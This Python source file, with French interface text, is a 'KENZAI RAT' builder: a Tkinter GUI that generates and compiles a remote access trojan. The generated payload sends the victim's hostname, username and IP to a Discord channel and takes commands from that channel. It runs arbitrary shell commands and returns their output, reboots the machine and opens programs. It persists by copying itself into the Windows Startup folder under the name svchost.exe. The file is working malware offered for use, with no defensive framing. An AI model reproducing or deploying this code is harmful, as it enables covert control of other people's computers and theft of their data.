#!/usr/bin/env python3
# KENZAI BUILDER v12.0 - Panel de construction (s'ouvre via option 14)

import os
import sys
import json
import threading
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
from datetime import datetime

class KenzaiBuilder:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("KENZAI BUILDER v12.0")
        self.root.geometry("900x750")
        self.root.configure(bg='#0a0a0a')
        self.root.resizable(False, False)
        self.setup_ui()
        self.center_window()
    
    def center_window(self):
        self.root.update_idletasks()
        w = self.root.winfo_width()
        h = self.root.winfo_height()
        x = (self.root.winfo_screenwidth() // 2) - (w // 2)
        y = (self.root.winfo_screenheight() // 2) - (h // 2)
        self.root.geometry(f'{w}x{h}+{x}+{y}')
    
    def setup_ui(self):
        logo = tk.Label(self.root, text="""
    ██╗  ██╗███████╗███╗   ██╗███████╗ █████╗ ██╗
    ██║ ██╔╝██╔════╝████╗  ██║╚══███╔╝██╔══██╗██║
    █████╔╝ █████╗  ██╔██╗ ██║  ███╔╝ ███████║██║
    ██╔═██╗ ██╔══╝  ██║╚██╗██║ ███╔╝  ██╔══██║██║
    ██║  ██╗███████╗██║ ╚████║███████╗██║  ██║██║
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝
        """, font=('Courier', 8), fg='#ff00ff', bg='#0a0a0a')
        logo.pack(pady=10)
        
        tk.Label(self.root, text="KENZAI RAT BUILDER v12.0", 
                font=('Arial', 16, 'bold'), fg='#00ff00', bg='#0a0a0a').pack()
        
        main_frame = tk.Frame(self.root, bg='#1a1a1a', bd=2, relief=tk.GROOVE)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        tk.Label(main_frame, text="CONFIGURATION DU RAT", 
                font=('Arial', 12, 'bold'), fg='#ff00ff', bg='#1a1a1a').pack(pady=10)
        
        # Token du Bot Discord
        tk.Label(main_frame, text="TOKEN DU BOT DISCORD:", 
                font=('Arial', 10, 'bold'), fg='#00ff00', bg='#1a1a1a').pack(anchor=tk.W, padx=20, pady=(10,5))
        self.token_entry = tk.Entry(main_frame, width=70, font=('Arial', 10),
                                   bg='#0a0a0a', fg='#00ff00', insertbackground='#00ff00')
        self.token_entry.pack(padx=20, pady=5, fill=tk.X)
        
        # ID du channel Discord
        tk.Label(main_frame, text="ID DU CHANNEL DISCORD:", 
                font=('Arial', 10, 'bold'), fg='#00ff00', bg='#1a1a1a').pack(anchor=tk.W, padx=20, pady=(10,5))
        self.channel_entry = tk.Entry(main_frame, width=70, font=('Arial', 10),
                                     bg='#0a0a0a', fg='#00ff00', insertbackground='#00ff00')
        self.channel_entry.pack(padx=20, pady=5, fill=tk.X)
        
        # Nom du fichier
        tk.Label(main_frame, text="NOM DU FICHIER .EXE:", 
                font=('Arial', 10, 'bold'), fg='#00ff00', bg='#1a1a1a').pack(anchor=tk.W, padx=20, pady=(10,5))
        self.filename_entry = tk.Entry(main_frame, width=70, font=('Arial', 10),
                                      bg='#0a0a0a', fg='#00ff00', insertbackground='#00ff00')
        self.filename_entry.pack(padx=20, pady=5, fill=tk.X)
        self.filename_entry.insert(0, "kenzai.exe")
        
        # Options
        options_frame = tk.LabelFrame(main_frame, text=" OPTIONS ", 
                                     font=('Arial', 10, 'bold'), fg='#ff00ff', bg='#1a1a1a')
        options_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.persistence = tk.BooleanVar()
        tk.Checkbutton(options_frame, text="Persistance au demarrage", 
                      variable=self.persistence, fg='#00ff00', bg='#1a1a1a',
                      selectcolor='#0a0a0a').pack(side=tk.LEFT, padx=20, pady=10)
        
        # Bouton Build
        self.build_btn = tk.Button(main_frame, text="CONSTRUIRE LE RAT", 
                                   font=('Arial', 12, 'bold'), bg='#ff00ff', fg='#0a0a0a',
                                   padx=20, pady=10, command=self.build_rat)
        self.build_btn.pack(pady=20)
        
        # Console
        console_frame = tk.LabelFrame(main_frame, text=" CONSOLE ", 
                                     font=('Arial', 10, 'bold'), fg='#ff00ff', bg='#1a1a1a')
        console_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        self.console = scrolledtext.ScrolledText(console_frame, height=12,
                                                bg='#0a0a0a', fg='#00ff00', font=('Courier', 9))
        self.console.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.status = tk.Label(self.root, text=" READY ", bd=1, relief=tk.SUNKEN,
                              anchor=tk.W, fg='#00ff00', bg='#1a1a1a')
        self.status.pack(side=tk.BOTTOM, fill=tk.X)
    
    def log(self, msg):
        self.console.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
        self.console.see(tk.END)
        self.status.config(text=f" {msg[:80]} ")
        self.root.update()
    
    def build_rat(self):
        bot_token = self.token_entry.get().strip()
        channel_id = self.channel_entry.get().strip()
        filename = self.filename_entry.get().strip()
        
        if not bot_token:
            messagebox.showerror("Erreur", "Token du bot Discord requis")
            return
        if not channel_id:
            messagebox.showerror("Erreur", "ID du channel Discord requis")
            return
        if not filename:
            filename = "kenzai.exe"
        if not filename.endswith('.exe'):
            filename += '.exe'
        
        self.build_btn.config(state=tk.DISABLED, text="COMPILATION EN COURS...")
        self.log(f"Construction: {filename}")
        
        def build_thread():
            try:
                persistence = "True" if self.persistence.get() else "False"
                
                payload = self.generate_payload(bot_token, channel_id, persistence)
                
                with open("rat_payload.py", "w", encoding="utf-8") as f:
                    f.write(payload)
                
                self.log("Compilation en .exe... (30-60 secondes)")
                
                result = subprocess.run(
                    [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole", 
                     "--name", filename.replace(".exe", ""), "rat_payload.py"],
                    capture_output=True, text=True
                )
                
                if os.path.exists(f"dist\\{filename}"):
                    size = os.path.getsize(f"dist\\{filename}")
                    self.log("BUILD REUSSI !")
                    self.log(f"Fichier: dist\\{filename} ({size:,} bytes)")
                    messagebox.showinfo("Succes", f"Build reussi !\n\nFichier: dist\\{filename}")
                else:
                    self.log("ERREUR: Echec de compilation")
                    if result.stderr:
                        self.log(result.stderr[:500])
                
                for f in ["rat_payload.py", "rat_payload.spec"]:
                    if os.path.exists(f): os.remove(f)
                if os.path.exists("build"):
                    import shutil; shutil.rmtree("build")
                    
            except Exception as e:
                self.log(f"ERREUR: {str(e)}")
                messagebox.showerror("Erreur", str(e))
            finally:
                self.build_btn.config(state=tk.NORMAL, text="CONSTRUIRE LE RAT")
        
        threading.Thread(target=build_thread, daemon=True).start()
    
    def generate_payload(self, bot_token, channel_id, persistence):
        return f'''import os, sys, time, json, socket, subprocess, requests, threading
from datetime import datetime

BOT_TOKEN = "{bot_token}"
CHANNEL_ID = "{channel_id}"
PERSIST = {persistence}

def send_discord(content):
    try:
        url = f"https://discord.com/api/v9/channels/{{CHANNEL_ID}}/messages"
        headers = {{"Authorization": f"Bot {{BOT_TOKEN}}", "Content-Type": "application/json"}}
        data = {{"content": content}}
        requests.post(url, headers=headers, json=data, timeout=5)
    except:
        pass

def send_embed(title, description, color=0xff0000):
    try:
        url = f"https://discord.com/api/v9/channels/{{CHANNEL_ID}}/messages"
        headers = {{"Authorization": f"Bot {{BOT_TOKEN}}", "Content-Type": "application/json"}}
        embed = {{
            "embeds": [{{
                "title": title,
                "description": description,
                "color": color,
                "timestamp": datetime.now().isoformat()
            }}]
        }}
        requests.post(url, headers=headers, json=embed, timeout=5)
    except:
        pass

def get_info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "Inconnue"
    return {{
        "pc": socket.gethostname(),
        "user": os.getlogin(),
        "os": "Windows",
        "ip": ip,
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }}

def execute_cmd(cmd):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return r.stdout + r.stderr
    except:
        return "Erreur"

def reboot():
    os.system("shutdown /r /t 5")
    return "Redemarrage dans 5 secondes"

def open_app(app):
    os.system(f"start {{app}}")
    return f"Ouverture de {{app}}"

def persist():
    if not PERSIST:
        return
    try:
        import shutil
        dest = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "svchost.exe")
        if not os.path.exists(dest):
            shutil.copy2(sys.argv[0], dest)
    except:
        pass

def listen_for_commands():
    last_id = None
    while True:
        try:
            url = f"https://discord.com/api/v9/channels/{{CHANNEL_ID}}/messages?limit=1"
            headers = {{"Authorization": f"Bot {{BOT_TOKEN}}"}}
            r = requests.get(url, headers=headers, timeout=5)
            
            if r.status_code == 200:
                messages = r.json()
                if messages and (not last_id or messages[0]['id'] != last_id):
                    last_id = messages[0]['id']
                    content = messages[0].get('content', '')
                    
                    if content.startswith('!'):
                        cmd = content[1:].lower()
                        
                        if cmd == "info":
                            info = get_info()
                            send_embed("Infos Systeme", f"```\\nPC: {{info['pc']}}\\nUser: {{info['user']}}\\nIP: {{info['ip']}}\\n```")
                        
                        elif cmd == "reboot":
                            send_discord(reboot())
                        
                        elif cmd.startswith("open "):
                            app = cmd[5:]
                            send_discord(open_app(app))
                        
                        elif cmd.startswith("cmd "):
                            result = execute_cmd(cmd[4:])
                            send_discord(f"```\\n{{result[:1900]}}\\n```")
                        
                        elif cmd == "kill":
                            send_discord("Arret du RAT...")
                            sys.exit()
                        
                        else:
                            send_discord("Commandes: !info, !reboot, !open [app], !cmd [commande], !kill")
            time.sleep(2)
        except:
            time.sleep(5)

def main():
    info = get_info()
    send_embed("NOUVEAU CLIENT CONNECTE !", f"```\\nPC: {{info['pc']}}\\nUser: {{info['user']}}\\nIP: {{info['ip']}}\\n```", 0x00ff00)
    
    persist()
    
    threading.Thread(target=listen_for_commands, daemon=True).start()
    
    while True:
        time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except:
        pass
'''
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = KenzaiBuilder()
    app.run()